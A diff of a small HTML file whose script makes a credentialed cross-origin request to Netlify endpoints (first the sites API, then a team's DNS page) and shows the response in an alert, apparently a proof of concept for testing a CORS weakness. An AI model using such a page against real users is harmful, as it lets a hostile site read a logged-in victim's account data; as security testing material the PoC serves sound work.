@@ -1,5 +1,5 @@
 <html>
 <script>
-var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.netlify.com/api/v1/hzero-1/sites?filter=all&sort_by=updated_at&page=1&per_page=15',true); req.send('{}');  req.withCredentials = true; function reqListener() { alert(this.responseText); };
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.netlify.com/teams/hzero-1/dns',true); req.send('{}');  req.withCredentials = true; function reqListener() { alert(this.responseText); };
 </script>
 </html>
